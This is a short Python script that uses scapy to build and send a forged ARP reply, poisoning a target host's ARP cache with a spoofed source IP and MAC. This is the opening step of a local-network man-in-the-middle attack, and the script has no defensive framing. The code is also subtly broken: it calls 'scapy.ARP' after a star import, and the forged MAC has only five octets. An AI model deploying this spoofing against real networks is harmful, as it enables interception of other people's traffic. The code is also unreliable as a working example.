from scapy.all import *


def spoofing():
    packet = scapy.ARP(op=2, hwdst="30:89:4A:D2:5A:AA", pdst="10.33.73.72", psrc="10.13.33.37", hwsrc="ad:be:ef:ca:fe")
    scapy.send(packet, verbose=False)